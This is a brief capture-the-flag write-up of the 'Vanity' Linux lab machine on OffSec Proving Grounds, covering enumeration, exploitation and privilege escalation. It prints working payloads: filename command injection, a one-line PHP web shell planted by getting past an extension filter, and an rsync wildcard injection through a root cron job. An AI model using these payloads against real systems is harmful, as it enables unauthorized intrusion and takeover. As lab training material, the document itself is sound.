# Vanity

## Intro

Vanity is a 'get to work' intermediate linux machine from offsec proving grounds.

## Enum

### Nmap

Nmap scan of all tcp ports.

```
22/tcp  open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
873/tcp open  rsync   syn-ack ttl 61 (protocol version 31)
```

### HTTP 80

Username and email from landing page footer.  

`enox@vanity.offsec`


## Command injection

In burp repeater, changing the filename returns the command output after execution.  

`mal.txt ; id ;`


The following filename injection creates a webshell in uploads, beating the .php file filter because linux  
ignores closed quotes in a string.  

`mal.txt ; echo '<?php system($_REQUEST[\"cmd\"]);?>' > shell.p'h'p ;`

A rev shell file can be uploaded and caught through port 873 as I think that is the only one not being blocked.

## Root

There is a cron job running that executes a bash script.  

`/opt/backup.sh`

This runs rsync using a wildcard enabling an injection attack.  

`touch /var/www/html/uploads/-e sh evil.sh`
